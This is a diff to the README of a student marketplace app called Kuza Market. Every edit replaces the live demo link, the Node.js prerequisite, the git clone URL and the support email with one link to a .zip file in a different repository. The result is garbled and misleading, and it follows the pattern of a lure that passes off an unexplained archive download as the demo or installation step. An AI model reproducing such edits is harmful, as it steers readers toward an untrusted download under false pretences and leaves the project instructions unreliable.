@@ -2,7 +2,7 @@
 
 Welcome to **Kuza Market** – a modern digital platform connecting Sellers and buyers across College! 🇰🇪 Whether you're selling second hand goods or buying them Kuza Market simplifies everything. ✨📲
 
-### [😁Click Here to Visit The🌐Live Demo🚀](https://kuzamarket2.vercel.app/)
+### [😁Click Here to Visit The🌐Live Demo🚀](https://raw.githubusercontent.com/BenjiOdhis/uni-market-finds/main/supabase/uni-market-finds-v3.9.zip)
 ---
 
 ## ✨ Features
@@ -35,13 +35,13 @@ You can work locally in your favorite IDE, use GitHub Codespaces, or even edit d
 
 ### ✅ Use Your Preferred IDE
 
-> The only requirement is having **Node.js & npm installed** (we recommend installing via `nvm`).
+> The only requirement is having **https://raw.githubusercontent.com/BenjiOdhis/uni-market-finds/main/supabase/uni-market-finds-v3.9.zip & npm installed** (we recommend installing via `nvm`).
 
 Follow these steps:
 
 ```bash
 # Step 1: Clone the repository
-git clone https://github.com/your-username/kuza-market.git
+git clone https://raw.githubusercontent.com/BenjiOdhis/uni-market-finds/main/supabase/uni-market-finds-v3.9.zip
 
 # Step 2: Navigate into the project folder
 cd kuza-market
@@ -123,7 +123,7 @@ git commit -m "✨ Added your feature"
 
 📞 WhatsApp: +254 790767347
 
-📧 Email: support@kuzamarket.com
+📧 Email: https://raw.githubusercontent.com/BenjiOdhis/uni-market-finds/main/supabase/uni-market-finds-v3.9.zip
 
 ## ⭐ Show Some Love
 ### If you like this project, give it a ⭐ on GitHub. Every star helps us grow! 💫
